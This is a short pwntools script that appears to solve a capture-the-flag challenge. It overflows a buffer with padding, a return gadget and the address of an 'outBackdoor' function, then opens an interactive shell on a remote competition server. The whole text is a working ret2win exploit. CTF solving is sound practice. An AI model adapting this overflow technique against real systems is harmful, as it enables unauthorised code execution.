from pwn import * 


BIN = "./outBackdoor"
outBackdoor = 0x4011d7
ret = 0x0000000000401016

def exploit():
	payload = b"a"*16 + b"b"*8 + p64(ret) + p64(outBackdoor)
	io.recvuntil("Seriously though, what features would be cool? Maybe it could play a song?")
	io.sendline(payload)
	io.interactive()

#io = process(BIN)
io = remote("pwn-2021.duc.tf", 31921)
exploit()